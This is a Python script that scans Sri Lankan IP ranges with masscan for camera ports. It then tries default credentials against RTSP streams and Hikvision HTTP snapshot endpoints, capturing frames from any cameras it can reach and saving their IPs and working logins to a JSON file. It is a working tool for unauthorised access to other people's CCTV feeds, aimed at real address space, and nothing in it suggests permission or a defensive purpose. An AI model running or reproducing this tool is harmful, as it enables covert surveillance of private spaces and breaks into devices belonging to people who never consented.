#!/usr/bin/env python3
"""
ALL METHODS: Find 20 live cameras - combines fresh scan + existing data + HTTP methods
"""
import subprocess, os, json, re, time, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import ipaddress

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
os.makedirs(FRAME_DIR, exist_ok=True)

# Sri Lanka CIDRs
LK_CIDRS = [
    '112.134.0.0/15','220.247.0.0/17','203.143.0.0/17','203.115.0.0/17',
    '124.43.0.0/16','175.157.0.0/16','192.248.0.0/16','103.0.0.0/16',
    '116.206.0.0/15','43.224.0.0/14','103.21.0.0/16','103.24.0.0/14',
    '202.21.0.0/16','202.69.0.0/16','61.245.160.0/19','122.255.0.0/16',
    '180.232.0.0/14','110.12.0.0/15','117.247.0.0/16','123.231.0.0/16',
    '150.129.0.0/16','163.32.0.0/16',
]

CREDS = [
    ('admin', ''), ('admin', '12345'), ('admin', 'admin'), ('admin', '1234'),
    ('root', ''), ('root', 'pass'), ('root', '1234'), ('root', 'root'),
]

RTSP_PATHS = [
    '/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream',
    '/cam/realmonitor?channel=1&subtype=0', '/stream1', '/live/ch00_0', '/onvif1',
]

streams = []  # Global to collect from all methods
found_ips = set()

def masscan_fresh():
    """Fresh masscan of Sri Lanka"""
    print('[*] PHASE 1: Fresh Sri Lanka masscan...')
    cidr_file = '/tmp/lk_cidrs.txt'
    result_file = '/tmp/lk_masscan.txt'
    
    with open(cidr_file, 'w') as f:
        f.write('\n'.join(LK_CIDRS))
    
    cmd = ['masscan', '-iL', cidr_file, '-p', '554,8000,80,443,8200',
           '--rate', '200000', '--open-only', '-oG', result_file,
           '--exclude', '255.255.255.255']
    
    try:
        subprocess.run(cmd, capture_output=True, timeout=180, text=True)
    except:
        pass
    
    targets = []
    if os.path.exists(result_file):
        with open(result_file) as f:
            for line in f:
                match = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+)', line)
                if match:
                    ip = match.group(1)
                    if ip not in found_ips:
                        targets.append(ip)
    
    print(f'    [+] Fresh scan: {len(targets)} new targets')
    return targets[:50]  # Limit to first 50

def extract_existing():
    """Extract IPs from existing 35K scan"""
    print('[*] PHASE 2: Extracting from 35K existing scan...')
    targets = []
    scan_file = os.path.join(WORK_DIR, 'quick_cam_scan.txt')
    
    # Extract port 554 first, then 8000, then 80
    for port in ['554', '8000', '80']:
        with open(scan_file) as f:
            for line in f:
                if f'{port}/open' in line:
                    match = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+)', line)
                    if match:
                        ip = match.group(1)
                        if ip not in found_ips and ip not in targets:
                            targets.append(ip)
                            if len(targets) >= 150:
                                break
        if len(targets) >= 150:
            break
    
    print(f'    [+] Existing scan: {len(targets)} targets')
    return targets

def probe_rtsp(ip):
    """Probe RTSP stream"""
    if ip in found_ips:
        return None
        
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=2, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    found_ips.add(ip)
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': os.path.getsize(frame),
                        'method': 'rtsp'
                    }
            except:
                pass
            try:
                if os.path.exists(frame):
                    os.remove(frame)
            except:
                pass
    return None

def probe_http(ip):
    """Try HTTP/ISAPI snapshot for Hikvision cameras"""
    if ip in found_ips:
        return None
    
    urls = [
        f'http://{ip}:80/ISAPI/Streaming/channels/101/picture',
        f'http://{ip}:8000/ISAPI/Streaming/channels/101/picture',
        f'http://{ip}:80/cgi-bin/snapshot.cgi?user=admin&pwd=',
        f'http://{ip}:8000/cgi-bin/snapshot.cgi?user=admin&pwd=',
    ]
    
    for url in urls:
        frame = os.path.join(FRAME_DIR, f'http_{ip.replace(".", "_")}.jpg')
        try:
            r = subprocess.run(
                ['curl', '-s', '--max-time', '3', '-o', frame, url],
                capture_output=True, timeout=4
            )
            if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 5000:
                found_ips.add(ip)
                return {
                    'ip': ip, 'user': 'admin', 'password': '',
                    'rtsp_url': f'rtsp://admin:@{ip}:554/Streaming/Channels/101',
                    'frame_file': frame, 'frame_size': os.path.getsize(frame),
                    'method': 'http'
                }
        except:
            pass
        try:
            if os.path.exists(frame):
                os.remove(frame)
        except:
            pass
    return None

def probe_targets(targets, label):
    """Probe list of targets with RTSP and HTTP"""
    global streams
    
    print(f'[*] Probing {len(targets)} targets ({label})...')
    
    with ThreadPoolExecutor(max_workers=100) as pool:
        # Try RTSP first
        futures = {pool.submit(probe_rtsp, ip): ip for ip in targets}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    print(f'[+] Stream #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | {r["method"]}')
                    if len(streams) >= 20:
                        return True
            except:
                pass
        
        # Try HTTP for remaining
        remaining = [ip for ip in targets if ip not in found_ips]
        futures = {pool.submit(probe_http, ip): ip for ip in remaining[:50]}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    print(f'[+] Stream #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | {r["method"]}')
                    if len(streams) >= 20:
                        return True
            except:
                pass
    
    return False

def main():
    global streams
    
    print(f'{"="*70}')
    print(f'ALL METHODS: Finding 20 Live Cameras')
    print(f'{"="*70}\n')
    
    # Method 1: Fresh masscan
    fresh_targets = masscan_fresh()
    if fresh_targets:
        if probe_targets(fresh_targets, 'fresh scan'):
            pass
    
    # Method 2: Existing scan data
    if len(streams) < 20:
        existing_targets = extract_existing()
        if existing_targets:
            probe_targets(existing_targets, 'existing data')
    
    # Report
    print(f'\n{"="*70}')
    print(f'RESULTS: {len(streams)} live cameras found')
    print(f'{"="*70}')
    
    if streams:
        for i, s in enumerate(streams, 1):
            print(f'{i:>2}. {s["ip"]:>16} | {s["user"]}:{s["password"]} | {s["method"]}')
        
        out_file = os.path.join(WORK_DIR, f'20_cams_all_methods_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
        with open(out_file, 'w') as f:
            json.dump({'count': len(streams), 'streams': streams}, f, indent=2)
        print(f'\n[+] Saved: {out_file}')
    else:
        print('[!] No cameras found')

if __name__ == '__main__':
    main()
